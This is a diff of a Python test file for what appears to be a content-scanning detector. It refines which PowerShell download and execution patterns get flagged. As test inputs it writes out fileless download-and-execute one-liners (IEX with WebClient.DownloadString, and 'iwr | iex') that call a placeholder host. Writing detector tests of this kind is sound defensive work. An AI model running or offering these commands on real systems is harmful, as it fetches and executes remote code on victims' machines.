@@ -36,12 +36,45 @@ def test_detects_encoded_powershell():
 def test_iwr_alias_does_not_match_inside_words():
     # 'defnyddiwr' (Welsh for "user") must not trigger the PowerShell iwr alias.
     ids = _ids(ContentPatternDetector().detect(_tree("django.po", 'msgstr "defnyddiwr"\n')))
-    assert "invoke_webrequest" not in ids
+    assert "ps_download_file" not in ids
 
 
-def test_invoke_webrequest_full_name_still_matches():
-    ids = _ids(ContentPatternDetector().detect(_tree("a.ps1", "Invoke-WebRequest http://x\n")))
-    assert "invoke_webrequest" in ids
+def test_invoke_webrequest_requires_download_intent():
+    # A bare Invoke-WebRequest (API call / health check) is NOT download-exec and
+    # must not be flagged; only an actual file download (-OutFile) counts.
+    health = _ids(
+        ContentPatternDetector().detect(
+            _tree("a.ps1", "(Invoke-WebRequest $u -TimeoutSec 5).StatusCode\n")
+        )
+    )
+    assert "ps_download_file" not in health
+    dl = _ids(
+        ContentPatternDetector().detect(_tree("a.ps1", "Invoke-WebRequest -Uri $u -OutFile $zip\n"))
+    )
+    assert "ps_download_file" in dl
+
+
+def test_start_process_is_not_flagged():
+    # Launching a local process (cmd/wscript) is common in install scripts and is
+    # not download-and-execute.
+    ids = _ids(
+        ContentPatternDetector().detect(
+            _tree("a.ps1", 'Start-Process -FilePath "cmd.exe" -ArgumentList "/c","x"\n')
+        )
+    )
+    assert "start_process" not in ids and "ps_iex_download" not in ids
+
+
+def test_powershell_iex_download_is_flagged():
+    # The real fileless-exec technique: download a string and Invoke-Expression it.
+    iex = _ids(
+        ContentPatternDetector().detect(
+            _tree("a.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://e/x')\n")
+        )
+    )
+    assert "ps_iex_download" in iex
+    piped = _ids(ContentPatternDetector().detect(_tree("b.ps1", "iwr http://e/x | iex\n")))
+    assert "ps_iex_download" in piped
 
 
 def test_etc_passwd_is_not_a_credential_signal():
